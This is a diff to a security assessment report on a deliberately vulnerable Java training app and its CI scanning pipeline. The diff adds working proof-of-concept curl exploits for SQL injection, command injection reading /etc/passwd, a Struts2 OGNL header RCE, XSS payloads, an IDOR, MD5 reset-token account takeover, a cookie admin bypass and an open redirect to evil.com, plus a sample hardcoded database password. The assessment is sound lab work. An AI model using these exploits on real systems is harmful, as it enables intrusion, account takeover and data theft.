@@ -2,7 +2,7 @@
 
 **Date:** 2026-03-11
 **Application:** Damn Vulnerable Java Application (DVJA)
-**Pipeline:** DevSecOps CI/CD (CodeQL SAST + Trivy SCA + Trivy Container + Gitleaks)
+**Pipeline:** DevSecOps CI/CD (CodeQL SAST + Trivy SCA + Trivy Container + Gitleaks + detect-secrets)
 **Repository:** LaiKash/dvja
 
 ---
@@ -16,7 +16,8 @@
 5. [Container Scan Findings — Trivy Image (True/False Positive Analysis)](#5-container-scan-findings--trivy-image)
 6. [Vulnerabilities Missed by the Pipeline](#6-vulnerabilities-missed-by-the-pipeline)
 7. [Exploits](#7-exploits)
-8. [Recommendations](#8-recommendations)
+8. [POC Verification Results](#8-poc-verification-results)
+9. [Recommendations](#9-recommendations)
 
 ---
 
@@ -30,7 +31,7 @@ The DevSecOps pipeline produced **29 unique GitHub issues** across four security
 | CodeQL (SAST) issues | 4 |
 | Trivy SCA (dependencies) issues | 20 |
 | Trivy Container (container-only packages) issues | 5 |
-| Gitleaks (secrets) | 0 (see Appendix C.1) |
+| Gitleaks + detect-secrets | 0 + 5 (see Appendix C.1) |
 | Solution docs | 10 (A1–A10) |
 | **True Positives** | **29 (100%)** |
 | **False Positives** | **0** |
@@ -774,9 +775,212 @@ curl "http://dvja:8080/userSearch.action" \
 
 ---
 
-## 8. Recommendations
+## 8. POC Verification Results
 
-### 8.1 Pipeline Improvements
+All exploits were executed against a live DVJA instance (`docker compose up` on localhost:8080) on 2026-03-14. Results confirm every documented vulnerability is exploitable.
+
+### Summary
+
+| # | Vulnerability | OWASP | Exploit Confirmed | Severity | Pipeline Detected |
+|---|--------------|-------|-------------------|----------|-------------------|
+| 1 | SQL Injection | A1 | **YES** — all users dumped | Critical | Yes (CodeQL #22) |
+| 2 | Command Injection | A1 | **YES** — `uid=0(root)`, read `/etc/passwd` | Critical | Yes (CodeQL #21) |
+| 3 | Struts2 RCE (CVE-2017-5638) | A9 | **YES** — `uid=0(root)` via Content-Type OGNL | Critical | Yes (Trivy SCA) |
+| 4a | Reflected XSS | A3 | **YES** — `<img onerror=alert()>` rendered unescaped | High | No (needs DAST) |
+| 4b | Stored XSS | A3 | **YES** — XSS payload persists in product list | High | No (needs DAST) |
+| 5 | IDOR | A4 | **YES** — changed victim's password from attacker session | High | No (needs DAST) |
+| 6 | devMode Info Disclosure | A5 | **YES** — full stack trace with source file/line | Medium | Partial (CodeQL) |
+| 7 | Broken Auth (MD5 reset token) | A2 | **YES** — reset any user's password via `MD5(login)` | Critical | No (needs DAST) |
+| 8a | Admin Bypass via Cookie | A7 | **YES** — `Cookie: admin=1` dumps all users as JSON | Critical | No (needs DAST) |
+| 8b | Open Redirect | A10 | **YES** — 302 redirect to `https://evil.com` | Medium | No (needs DAST) |
+
+### POC 1: SQL Injection (A1)
+
+**Endpoint:** `GET /userSearch.action?login=' OR '1'='1`
+**Auth required:** Yes (session cookie)
+
+```
+$ curl -b session "http://localhost:8080/userSearch.action?login=' OR '1'='1"
+
+Result: All users dumped from database
+  ID: 18, Name: TestUser, Email: test@test.com
+  ID: 19, Name: VictimUser, Email: victim@test.com
+```
+
+The JPQL query in `UserService.findByLoginUnsafe()` concatenates user input directly, allowing injection to bypass `WHERE` clause logic and return all rows.
+
+### POC 2: Command Injection (A1)
+
+**Endpoint:** `POST /ping.action` with `address=127.0.0.1; <command>`
+**Auth required:** Yes (session cookie)
+
+```
+$ curl -b session -X POST http://localhost:8080/ping.action -d 'address=127.0.0.1;id'
+
+uid=0(root) gid=0(root) groups=0(root)
+
+$ curl -b session -X POST http://localhost:8080/ping.action \
+  --data-urlencode 'address=127.0.0.1; cat /etc/passwd | head -5'
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+```
+
+`PingAction.doExecCommand()` passes user input to `Runtime.exec()` through a shell, allowing command chaining via `;`, `&&`, or `|`. The container runs as **root**, meaning full system compromise.
+
+### POC 3: Struts2 RCE — CVE-2017-5638 (A9)
+
+**Endpoint:** Any `.action` URL (unauthenticated)
+**Method:** Malicious `Content-Type` header with OGNL expression
+
+```
+$ curl -H "Content-Type: %{(#_='multipart/form-data')...(#cmd='id')...}" \
+  http://localhost:8080/login.action
+
+uid=0(root) gid=0(root) groups=0(root)
+
+$ curl -H "Content-Type: %{...(#cmd='cat /etc/hostname')...}" \
+  http://localhost:8080/login.action
+
+57f6f8d0919e
+```
+
+This is a pre-auth RCE — no login needed. The Struts2 multipart parser evaluates OGNL expressions in the `Content-Type` header before any authentication interceptor runs. Combined with the container running as root, this gives full system access with a single HTTP request.
+
+### POC 4a: Reflected XSS (A3)
+
+**Endpoint:** `GET /listProduct.action?searchQuery=<img src=x onerror=alert(1)>`
+**Auth required:** Yes
+
+```
+$ curl -b session "http://localhost:8080/listProduct.action?searchQuery=<img src=x onerror=alert(1)>"
+
+Response contains:
+  Listing products with <strong>search query: </strong> <img src=x onerror=alert(1)>
+```
+
+The `ProductList.jsp` uses `<%= request.getParameter("searchQuery") %>` (raw JSP scriptlet) in the label text, which outputs the parameter without HTML encoding. The Struts `<s:textfield>` input is properly escaped, but the label is not.
+
+### POC 4b: Stored XSS (A3)
+
+**Endpoint:** `POST /addEditProduct.action` then `GET /listProduct.action`
+**Auth required:** Yes
+
+```
+$ curl -b session -X POST http://localhost:8080/addEditProduct.action \
+  --data-urlencode "product.name=<img src=x onerror=alert('StoredXSS')>" \
+  -d 'product.description=test&product.code=XSS001&product.tags=test'
+
+$ curl -b session http://localhost:8080/listProduct.action
+
+Response contains:
+  <td><img src=x onerror=alert('StoredXSS')></td>
+```
+
+The `ProductList.jsp` renders product names with `<s:property value="name" escape="false"/>`, disabling Struts' default HTML escaping. The XSS payload is stored in the database and executes for every user who views the product list.
+
+### POC 5: IDOR (A4)
+
+**Endpoint:** `POST /editUser.action`
+**Auth required:** Yes (but no authorization check on `userId`)
+
+```
+$ # Attacker (userId=18) changes Victim's (userId=19) password:
+$ curl -b attacker_session -X POST http://localhost:8080/editUser.action \
+  -d 'userId=19&email=hacked@evil.com&password=Hacked123&passwordConfirmation=Hacked123'
+
+HTTP 200 OK
+
+$ # Verify: login as victim with attacker-set password:
+$ curl -X POST http://localhost:8080/login.action \
+  -d 'login=victim&password=Hacked123'
+
+HTTP 200 — login successful (redirected to home)
+```
+
+`UserAction.edit()` takes `userId` from the request body and updates that user's record without verifying it matches the authenticated session user. Any logged-in user can modify any other user's email, password, and profile.
+
+### POC 6: Security Misconfiguration — devMode (A5)
+
+**Endpoint:** `GET /api/ping.action?login=nonexistent`
+**Auth required:** No
+
+```
+$ curl "http://localhost:8080/api/ping.action?login=nonexistent_user"
+
+<h2>Struts Problem Report</h2>
+Messages: (none)
+File: com/appsecco/dvja/controllers/ApiAction.java
+Line number: 42
+Stacktrace: java.lang.NullPointerException
+  at com.appsecco.dvja.controllers.ApiAction.ping(ApiAction.java:42)
+  ...
+```
+
+`struts.devMode=true` in `struts.xml` causes full Java stack traces with source file paths and line numbers to be displayed to the user. This leaks internal architecture details useful for further exploitation.
+
+### POC 7: Broken Auth — Password Reset Takeover (A2)
+
+**Endpoint:** `POST /resetPasswordExecute.action`
+**Auth required:** No
+
+```
+$ # The reset key is MD5(login). Compute it for any target:
+$ echo -n "victim" | md5
+96d4976b516a16ac19d148f3b744eee1
+
+$ curl -X POST http://localhost:8080/resetPasswordExecute.action \
+  -d 'login=victim&key=96d4976b516a16ac19d148f3b744eee1&password=ResetByAttacker1&passwordConfirmation=ResetByAttacker1'
+
+HTTP 200 — password reset successful
+
+$ # Login as victim with attacker-chosen password:
+$ curl -X POST http://localhost:8080/login.action \
+  -d 'login=victim&password=ResetByAttacker1'
+
+HTTP 200 — login successful
+```
+
+The reset token is `MD5(login)` — a deterministic, non-secret value. Any attacker who knows a username can reset their password without any authentication or email verification.
+
+### POC 8a: Admin Bypass via Cookie (A7)
+
+**Endpoint:** `GET /api/userList.action`
+**Auth required:** No (just a cookie)
+
+```
+$ curl -H "Cookie: admin=1" http://localhost:8080/api/userList.action
+
+{"count":2,"users":[
+  {"id":"18","login":"testuser","email":"test@test.com"},
+  {"id":"19","login":"victim","email":"victim@test.com"}
+]}
+```
+
+`ApiAction.adminShowUsers()` checks `request.getCookies()` for an `admin` cookie with value `1`. Since cookies are client-controlled, any user (or unauthenticated attacker) can set this cookie and dump the entire user database.
+
+### POC 8b: Open Redirect (A10)
+
+**Endpoint:** `GET /redirect.action?url=https://evil.com`
+**Auth required:** No
+
+```
+$ curl -o /dev/null -w "HTTP code: %{http_code}\nLocation: %{redirect_url}" \
+  "http://localhost:8080/redirect.action?url=https://evil.com"
+
+HTTP code: 302
+Location: https://evil.com/
+```
+
+`RedirectAction` takes the `url` parameter and issues a 302 redirect without any validation. This enables phishing attacks where the attacker sends a legitimate-looking DVJA link that redirects to a credential harvesting page.
+
+---
+
+## 9. Recommendations
+
+### 9.1 Pipeline Improvements
 
 | Gap | Recommendation |
 |-----|----------------|
@@ -789,7 +993,7 @@ curl "http://dvja:8080/userSearch.action" \
 | Configuration issues not detected | Add configuration scanning (e.g., `struts.devMode` checks, hardcoded secrets in properties) |
 | Container build tool noise | Adopt multi-stage Dockerfile to eliminate Maven/Plexus/XStream from production image (see Section 5.4) |
 
-### 8.2 Remediation Priority
+### 9.2 Remediation Priority
 
 | Priority | Vulnerability | Fix |
 |----------|--------------|-----|
@@ -899,16 +1103,34 @@ no leaks found
 
 This is not a fork-specific issue — any secret committed before the pipeline was installed would be invisible with incremental scanning.
 
-**Secondary concern:** Even with a full scan, the default Gitleaks ruleset may not match `mysql.password=ec95c258266b8e985848cae688effa2b` since it targets specific token formats (AWS keys, GitHub tokens, etc.), not generic password assignments in config files. A `.gitleaks.toml` with custom rules would be needed.
+**Secondary concern:** Even with `--no-git`, the default Gitleaks ruleset does not match `mysql.password=ec95c258266b8e985848cae688effa2b` — Gitleaks targets specific token formats (AWS keys with `AKIA` prefix, GitHub tokens with `ghp_`, etc.), not generic `password=value` patterns. This is by design: casting a wide net on `key=value` patterns produces too many false positives across diverse codebases.
 
-**Remediation applied:** The pipeline now uses a two-tier scanning strategy:
+**Investigation of alternative tools:**
 
-| Trigger | Scan Scope | Purpose |
-|---------|-----------|---------|
-| `push` to any branch | Last commit only (incremental via gitleaks-action) | Catch new secrets in real-time |
-| `pull_request` to main/master | Full file scan (`--no-git`) | Gate merges — ensure no secrets exist in the current codebase |
+| Tool | Catches `mysql.password=ec95c...`? | Custom rules needed? | Status |
+|------|-----------------------------------|-----------------------|--------|
+| **Gitleaks** | No | Yes (custom `.toml`) | Active, widely adopted |
+| **TruffleHog** | No | Yes (custom YAML) | Active, same design philosophy as Gitleaks |
+| **Semgrep Secrets** | Partially (free `p/secrets` has limitations with config files) | No | Full product requires paid license |
+| **Whispers** (Skyscanner) | Yes | No | **Archived** (Oct 2023) — not recommended |
+| **detect-secrets** (Yelp) | **Yes** | **No** | Active, Apache 2.0 |
 
-The `--no-git` flag bypasses git history entirely and scans all files on disk. This is faster than a full history scan and catches any secret currently present in the repo, regardless of when it was committed.
+**detect-secrets** (v1.5.0) catches the hardcoded credentials out-of-the-box using two independent signals:
+- **KeywordDetector**: flags lines where a keyword like `password` appears in an assignment context
+- **HexHighEntropyString**: flags the `ec95c258266b8e985848cae688effa2b` value due to high hex entropy
+
+Verified locally — `detect-secrets scan` with default plugins finds all 3 instances (2 in `docker-compose.yml`, 1 in `config.properties`) with zero configuration.
+
+**Remediation applied:** The pipeline now uses a **dual-scanner** approach:
+
+| Tool | Strength | Role |
+|------|----------|------|
+| **Gitleaks** (`--no-git`) | Provider-specific tokens (AWS, GitHub, Slack, etc.), git-history scanning, SARIF output | Catch high-confidence token leaks |
+| **detect-secrets** (default plugins) | Generic `password=value` keyword matching + entropy analysis in config files | Catch hardcoded credentials that Gitleaks misses |
+
+Findings from both scanners are **deduplicated by file:line** and merged into a single `[SECRET]` GitHub issue. This eliminates the need for custom Gitleaks rules (`.gitleaks.toml` only contains path exclusions).
+
+The `--no-git` flag on Gitleaks bypasses git history and scans all files on disk. This catches any secret currently present in the repo, regardless of when it was committed.
 
 **For full git-history audits** (e.g., finding secrets that were committed and later removed — still in history, still need rotation), run a manual scan with `--log-opts=--all`:
 
